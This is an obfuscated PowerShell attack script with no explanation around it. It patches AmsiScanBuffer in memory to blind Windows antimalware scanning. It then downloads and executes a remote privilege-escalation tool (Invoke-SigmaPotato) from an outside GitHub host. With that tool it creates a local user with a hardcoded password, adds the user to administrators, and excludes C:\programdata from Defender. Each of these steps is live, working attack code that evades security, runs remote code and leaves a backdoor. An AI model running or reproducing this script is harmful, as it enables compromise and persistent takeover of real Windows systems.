#Rasta-mouses Amsi-Scan-Buffer patch \n
$GGdyEXh28sd5LfJ = @"
using System;
using System.Runtime.InteropServices;
public class GGdyEXh28sd5LfJ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr CCA8LX7sBhERjyNl2w, string vw4Q1w0yEi);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr U5HbDv, UIntPtr NcP7OXztqH87MM, uint uUeL4h, out uint M0CSKMGuxD);
}
"@

Add-Type $GGdyEXh28sd5LfJ

$H4PgPpHGFwj9 = [GGdyEXh28sd5LfJ]::LoadLibrary("$([CHar](97*30/30)+[chaR]([byTE]0x6d)+[chAr](88+27)+[CHar]([ByTe]0x69)+[ChAR](46+21-21)+[ChaR]([ByTe]0x64)+[cHAr](108*65/65)+[CHaR](108+52-52))")
$Qa1O7 = [GGdyEXh28sd5LfJ]::GetProcAddress($H4PgPpHGFwj9, "$([cHar]([bYTE]0x41)+[ChAr]([byte]0x6d)+[chAR]([BYTe]0x73)+[ChAr]([ByTe]0x69)+[cHar]([bYTE]0x53)+[ChAR](99)+[chAr](97+57-57)+[cHaR](110)+[ChAR](18+48)+[cHAR](117)+[ChAR]([BYTE]0x66)+[CHAR]([byTe]0x66)+[chaR]([byTe]0x65)+[ChaR](114))")
$p = 0
[GGdyEXh28sd5LfJ]::VirtualProtect($Qa1O7, [uint32]5, 0x40, [ref]$p)
$WuTWUiP1b05 = "0xB8"
$isYZzdluAMatrVPRn = "0x57"
$kGWUtaZ04COQRU30H4 = "0x00"
$v7wWPhgHSrdpGVj2Gz = "0x07"
$ktgXNGz8VVkvFJPv0IR = "0x80"
$iyPF = "0xC3"
$ZB_JjvVJ = [Byte[]] ($WuTWUiP1b05,$isYZzdluAMatrVPRn,$kGWUtaZ04COQRU30H4,$v7wWPhgHSrdpGVj2Gz,+$ktgXNGz8VVkvFJPv0IR,+$iyPF)
[System.Runtime.InteropServices.Marshal]::Copy($ZB_JjvVJ, 0, $Qa1O7, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"














